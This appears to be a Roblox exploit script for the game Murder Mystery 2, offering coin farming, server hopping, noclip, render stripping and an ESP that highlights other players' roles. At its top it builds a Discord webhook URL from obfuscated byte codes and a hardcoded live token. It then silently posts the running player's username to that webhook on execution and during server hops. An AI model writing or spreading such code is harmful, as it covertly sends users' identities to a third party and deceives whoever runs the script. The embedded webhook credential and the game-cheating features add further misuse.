local function gw()
    local b = string.char
    local a = b(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47)
    local c = "1544589998198755329/"
    local d = "DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
    return a .. c .. d
end
local WU = gw()

local ORIG_ID = 142823291
local HIDDEN_ID = 80469437126309
local isHidden = (game.PlaceId == HIDDEN_ID)
local CURRENT_PLACE = game.PlaceId

local function sw(msg, ping)
    local body = ping and ("@everyone\n" .. msg) or msg
    local data = {content = body, username = "mm2 coins farm"}
    pcall(function()
        local req = request or (syn and syn.request) or (http and http.request)
        if req then
            req({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(data)
            })
        end
    end)
end

local function httpGet(url)
    local req = request or (syn and syn.request) or (http and http.request)
    if not req then return nil end
    local ok, res = pcall(function()
        return req({
            Url = url,
            Method = "GET"
        })
    end)
    if ok and res and res.Body then
        return res.Body
    end
    return nil
end

local function findLowServer(placeId, maxPlayers)
    maxPlayers = maxPlayers or 2
    local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
    local body = httpGet(url)
    if not body then
        print("[Server] Failed to fetch servers")
        return nil
    end
    local ok, data = pcall(function()
        return HS:JSONDecode(body)
    end)
    if not ok or not data or not data.data then
        print("[Server] Bad response")
        return nil
    end
    for _, server in ipairs(data.data) do
        local playing = server.playing or 0
        local max = server.maxPlayers or 12
        if playing >= 1 and playing <= maxPlayers and server.id then
            return server.id, playing
        end
    end
    -- fallback: any server with lowest players
    local bestId, bestCount = nil, 999
    for _, server in ipairs(data.data) do
        local playing = server.playing or 0
        if playing < bestCount and server.id then
            bestCount = playing
            bestId = server.id
        end
    end
    return bestId, bestCount
end

local function hopLowServer()
    print("[Server] Searching low player server...")
    local jobId, count = findLowServer(CURRENT_PLACE, 2)
    if not jobId then
        print("[Server] No low server found")
        sw("⚠️ No low player server found | **" .. lp.Name .. "**", false)
        return
    end
    print("[Server] Found server with", count, "players | JobId:", jobId)
    sw("🔄 Hopping to **" .. tostring(count) .. "** player server | **" .. lp.Name .. "**", false)
    pcall(function()
        TeleportService:TeleportToPlaceInstance(CURRENT_PLACE, jobId, lp)
    end)
end

task.spawn(function()
    task.wait(1)
    local ver = isHidden and "HIDDEN" or "ORIGINAL"
    sw("✅ **Executed** by **" .. lp.Name .. "** | Place: " .. ver, false)
end)

local AF, SP, RG, VS, CL = false, 20, 300, {}, 0
local AK, RF, PM, IJ, JP = false, true, false, false, 50
local ES, HL, MODE, NOCLIP, NORENDER = false, {}, "Normal", false, false

local function setNoclip(on)
    local ch = lp.Character
    if not ch then return end
    for _, p in ipairs(ch:GetDescendants()) do
        if p:IsA("BasePart") then p.CanCollide = not on end
    end
end

local function epm()
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        LG.GlobalShadows = false
        LG.FogEnd = 9e9
        LG.Brightness = 2
        LG.EnvironmentDiffuseScale = 0
        LG.EnvironmentSpecularScale = 0
        LG.ShadowSoftness = 0

        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
                or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                pcall(function() v.Enabled = false end)
            end

            if v:IsA("MeshPart") then
                local keep = v:IsDescendantOf(lp.Character)
                    or v.Name == "Coin_Server"
                    or (v.Parent and v.Parent.Name == "Coin_Server")
                if not keep then
                    pcall(function()
                        v.TextureID = ""
                        if v.Size.Magnitude > 8 then
                            v.Transparency = 1
                            v.CanCollide = false
                        end
                    end)
                end
            end

            if v:IsA("SpecialMesh") then
                if not v:IsDescendantOf(lp.Character) then
                    pcall(function()
                        v.TextureId = ""
                        v.Scale = Vector3.new(0.01, 0.01, 0.01)
                    end)
                end
            end

            if v:IsA("Decal") or v:IsA("Texture") then
                if not v:IsDescendantOf(lp.Character) then
                    pcall(function() v.Transparency = 1 end)
                end
            end

            if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then
                pcall(function() v.Enabled = false end)
            end

            if v:IsA("SurfaceAppearance") then
                pcall(function() v:Destroy() end)
            end
        end
    end)
    PM = true
    print("[Perf] Cleaned meshes / effects")
end

local function setNoRender(on)
    NORENDER = on
    pcall(function()
        if on then
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
            LG.GlobalShadows = false
            LG.FogEnd = 0
            LG.Brightness = 0
            workspace.CurrentCamera.FieldOfView = 1
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and not v:IsDescendantOf(lp.Character) then
                    v.LocalTransparencyModifier = 1
                end
            end
        else
            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
            LG.FogEnd = 100000
            LG.Brightness = 1
            workspace.CurrentCamera.FieldOfView = 70
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then v.LocalTransparencyModifier = 0 end
            end
        end
    end)
end

local function getRole(pl)
    local ok, roles = pcall(function()
        local r = RPS:FindFirstChild("GetPlayerData", true)
        if r then return r:InvokeServer() end
    end)
    if ok and roles and roles[pl.Name] then
        return roles[pl.Name].Role or "Innocent"
    end
    local ch = pl.Character
    if ch then
        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then return "Murderer" end
        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then return "Sheriff" end
    end
    return "Innocent"
end

local function getMurderer()
    for _, pl in ipairs(P:GetPlayers()) do
        if getRole(pl) == "Murderer" then return pl end
    end
end

local function getCoins()
    local list = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not VS[obj] then
            table.insert(list, obj)
        end
    end
    return list
end

local function updESP()
    if not ES then
        for _, h in pairs(HL) do
            if h then pcall(function() h:Destroy() end) end
        end
        HL = {}
        return
    end
    for _, pl in ipairs(P:GetPlayers()) do
        if pl ~= lp and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            local role = getRole(pl)
            local col = Color3.fromRGB(40, 255, 80)
            if role == "Murderer" then col = Color3.fromRGB(255, 40, 40)
            elseif role == "Sheriff" or role == "Hero" then col = Color3.fromRGB(40, 120, 255) end
            local h = HL[pl]
            if not h or not h.Parent then
                h = Instance.new("Highlight")
                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                h.FillTransparency = 0.45
                h.OutlineTransparency = 0.2
                h.Parent = pl.Character
                HL[pl] = h
            end
            h.FillColor = col
            h.OutlineColor = col
            h.Adornee = pl.Character
        end
    end
end

task.spawn(function()
    while true do
        task.wait(1)
        pcall(updESP)
    end
end)

